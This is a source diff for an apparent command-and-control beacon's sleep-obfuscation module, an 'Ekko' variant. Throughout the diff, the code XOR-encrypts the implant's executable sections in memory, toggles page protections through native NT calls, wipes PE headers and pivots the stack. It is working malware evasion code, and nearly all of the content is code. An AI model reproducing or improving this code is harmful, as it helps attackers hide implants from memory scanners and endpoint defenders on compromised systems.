@@ -1,8 +1,7 @@
 #include "../include/sleep_obf.h"
+#include "../include/sleep_utils.h"
 #include "../include/utils.h"
-#include "../include/config_parser.h"
 #include "../include/pandragon_runtime.h"
-#include "../include/resolver.h"
 /*
     shhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 
@@ -11,13 +10,14 @@
 */
 /* ---------------------------------------------------------------------------
  * Ekko Implementation Selection (from generated_config.h)
+ * EKKO_IMPL = 0 : unused (morpheus/none selected), compiles with .obf defaults
  * EKKO_IMPL = 1 : .obf section (static)
  * EKKO_IMPL = 2 : runtime RX allocation (dynamic)
  * ========================================================================== */
 #include "generated_config.h"
 #if !defined(EKKO_IMPL)
 #error "EKKO_IMPL not defined!"
-#elif EKKO_IMPL == 1
+#elif EKKO_IMPL == 0 || EKKO_IMPL == 1
 #define EKKO_USE_OBF_SECTION 1
 #define EKKO_USE_RUNTIME_RX  0
 #elif EKKO_IMPL == 2
@@ -56,26 +56,19 @@
  * --------------------------------------------------------------------------- */
 #define MAX_EKKO_SECTIONS  16
 #define EKKO_STACK_SIZE    0x4000       /* 16KB helper stack buffer */
-#define XOR_KEY_LENGTH     1024         /* repeating XOR key size */
 
 /* ---------------------------------------------------------------------------
  * Context Structure
  * --------------------------------------------------------------------------- */
 
-typedef struct _EKKO_SECTION_INFO {
-    PVOID  base;      /* section VA */
-    SIZE_T size;      /* in-memory size of section */
-    ULONG  oldProtect; /* original protection (saved during encrypt) */
-} EKKO_SECTION_INFO;
-
 typedef struct _EKKO_CONTEXT {
     functionTable*    nt;
 
     /* Derived XOR key (config_key XOR beacon_id, counter-expanded) */
-    uint8_t             xorKey[XOR_KEY_LENGTH];
+    uint8_t             xorKey[SLEEP_XOR_KEY_LENGTH];
 
     /* Sections that got encrypted (need decrypt on wake) */
-    EKKO_SECTION_INFO   sections[MAX_EKKO_SECTIONS];
+    SleepSectionInfo    sections[MAX_EKKO_SECTIONS];
     int                 sectionCount;
 
     /* PE header backup (if wipe enabled) */
@@ -171,6 +164,31 @@ static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
     functionTable* nt = ctx->nt;
     HANDLE hProcess = (HANDLE)-1;
 
+    /* 0. Encrypt sections: RW -> XOR -> RX */
+    for (int i = 0; i < ctx->sectionCount; i++) {
+        PVOID base = ctx->sections[i].base;
+        SIZE_T size = ctx->sections[i].size;
+        ULONG oldProtect = 0;
+        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
+        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, SLEEP_XOR_KEY_LENGTH);
+        base = ctx->sections[i].base;
+        size = ctx->sections[i].size;
+        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
+    }
+
+    /* 0b. Wipe PE headers if enabled */
+    if (ctx->wipePeHeaders && ctx->imageBase) {
+        PVOID hdrBase = ctx->imageBase;
+        SIZE_T hdrSize = 0x1000;
+        ULONG oldProtect = 0;
+        volatile uint8_t* p = (volatile uint8_t*)ctx->imageBase;
+        for (SIZE_T j = 0; j < 0x1000; j++) ctx->peHeaderBackup[j] = p[j];
+        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);
+        for (SIZE_T j = 0; j < 0x1000; j++) p[j] = 0;
+        hdrBase = ctx->imageBase;
+        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
+    }
+
     /* 1. Wait for timer signal */
     nt->NtWaitForSingleObject(ctx->doneEvent, FALSE, NULL);
 
@@ -181,7 +199,7 @@ static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
         ULONG oldProtect = 0;
 
         nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
-        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, XOR_KEY_LENGTH);
+        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, SLEEP_XOR_KEY_LENGTH);
         base = ctx->sections[i].base;
         size = ctx->sections[i].size;
         nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
@@ -219,36 +237,6 @@ static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
 /* ==========================================================================
  * Helper Functions (Preparation) - These run BEFORE encryption, can stay in .text
  * ========================================================================== */
-
-/* im pretty sure we also have this code in syscall code, todo clean */
-__attribute__((noinline))
-static int enumerateCodeSections(PVOID imageBase, EKKO_SECTION_INFO* sections, int maxSections) {
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dos->e_lfanew);
-    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));
-
-    int count = 0;
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSections; i++) {
-        uintptr_t secVA = (uintptr_t)imageBase + sec[i].VirtualAddress;
-        SIZE_T secSize = (sec[i].SizeOfRawData > sec[i].Misc.VirtualSize) ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
-
-        if ((sec[i].Characteristics & IMAGE_SCN_CNT_CODE) && (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
-            sections[count].base = (PVOID)secVA;
-            sections[count].size = secSize;
-            sections[count].oldProtect = 0;
-            count++;
-        }
-    }
-    return count;
-}
-
-__attribute__((noinline))
-static void deriveXorKey(uint8_t out[XOR_KEY_LENGTH], const uint8_t configKey[32], const uint8_t beaconId[8]) {
-    uint8_t seed[32];
-    for (int i = 0; i < 8; i++) seed[i] = configKey[i] ^ beaconId[i];
-    for (int i = 8; i < 32; i++) seed[i] = configKey[i];
-    for (int i = 0; i < XOR_KEY_LENGTH; i++) out[i] = seed[i % 32] ^ (uint8_t)(i / 32);
-}
 
 /* ==========================================================================
  * External symbols for .text$ekko subsection bounds (defined by linker)
@@ -431,34 +419,15 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
 
     g_debugPrint("[SleepObf_Ekko] [+] originalContext: Rsp=0x%llX Rip=0x%llX",
                  (UINT64)ctx->originalContext.Rsp, (UINT64)ctx->originalContext.Rip);
+#if EKKO_USE_OBF_SECTION
+    g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in .obf section)",
+                 (UINT64)ctx->pivotContext.Rsp, (UINT64)ctx->pivotContext.Rip);
+#else
     g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in RX stub)",
                  (UINT64)ctx->pivotContext.Rsp, (UINT64)ctx->pivotContext.Rip);
+#endif
 
-    /* 4. Encrypt sections (.text -> XOR -> RX) */
-    HANDLE hProcess = (HANDLE)-1;
-    for (int i = 0; i < ctx->sectionCount; i++) {
-        PVOID base = ctx->sections[i].base;
-        SIZE_T size = ctx->sections[i].size;
-        ULONG oldProtect = 0;
-        ekkoNt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
-        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, XOR_KEY_LENGTH);
-        base = ctx->sections[i].base;
-        ekkoNt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
-    }
-
-    /* 5. Wipe headers (optional) */
-    if (ctx->wipePeHeaders) {
-        PVOID hdrBase = ctx->imageBase;
-        SIZE_T hdrSize = 0x1000; /* why hardcode */
-        ULONG oldProtect = 0;
-        volatile uint8_t* p = (volatile uint8_t*)ctx->imageBase;
-        for (SIZE_T j = 0; j < 0x1000; j++) ctx->peHeaderBackup[j] = p[j];
-        ekkoNt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);
-        for (SIZE_T j = 0; j < 0x1000; j++) p[j] = 0;
-        ekkoNt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
-    }
-
-    /* 6. Pivot stack and enter waiting loop */
+    /* 4. Pivot stack and enter waiting loop */
     g_EkkoCtx = ctx;
     if (ctx->helperStack) {
         PTEB teb = ekkoNt->parameters.TEB;
